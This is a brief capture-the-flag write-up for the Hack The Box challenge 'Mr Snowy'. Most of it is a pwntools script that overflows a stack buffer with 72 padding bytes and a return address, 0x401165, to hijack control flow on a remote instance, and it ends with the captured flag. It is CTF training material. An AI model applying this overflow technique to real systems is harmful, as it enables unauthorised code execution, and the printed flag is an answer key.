# Mr Snowy

- Download and install pwntools
https://github.com/Gallopsled/pwntools


- Start docker instance, modify this script:

```python3
#!/bin/python3

from pwn import *

EXECUTABLE = './mr_snowy'
context.binary = EXECUTABLE
#p = process(EXECUTABLE, stdout=PTY, stdin=PTY)
p = remote('138.68.133.230', 30554)
p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'> ')

address = int(0x00401165)
payload = cyclic(72)
payload += p64(address)

p.sendline(payload)
p.recvline()
print(p.recvall())

```


Flag: `HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}`